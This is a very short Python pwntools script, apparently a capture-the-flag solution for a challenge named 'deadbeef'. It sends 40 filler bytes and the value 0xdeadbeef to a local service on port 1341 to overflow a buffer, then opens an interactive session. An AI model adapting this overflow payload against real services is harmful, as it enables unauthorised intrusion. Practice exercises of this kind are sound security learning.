from pwn import *

# p = process('./files/deadbeef')
p = remote('localhost', 1341)

payload = b'a'*40
payload += p32(0xdeadbeef)

p.sendline(payload)
p.interactive()